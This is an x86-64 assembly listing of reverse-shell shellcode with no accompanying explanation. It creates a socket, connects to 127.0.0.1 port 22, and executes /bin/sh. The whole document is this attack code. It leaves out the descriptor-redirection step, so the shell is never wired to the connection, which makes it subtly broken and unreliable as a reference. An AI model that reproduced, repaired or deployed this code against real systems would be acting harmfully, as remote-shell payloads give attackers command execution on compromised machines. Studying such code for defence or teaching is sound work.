section .data
        command db '/bin/sh', 0

section .text
        global _start

sockaddr:
        dw 2
        dw 0x1600
        dd 0x0100007F
        dq 0

_start:
        ;socket(AF_INET, SOCK_STREAM, 0)
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall 

        ;connect(socket, sockaddr, 16)
        mov rdi, rax
        lea rsi, [rel sockaddr]
        mov rdx, 16
        mov rax, 42
        syscall

        ;execve("/bin/sh", 0, 0)
        mov rax, 59
        mov rdi, command
        mov rdx, 0
        mov rsi, 0
        mov rdx, 0
        syscall

        mov rax, 60
        xor rdi, rdi
        syscall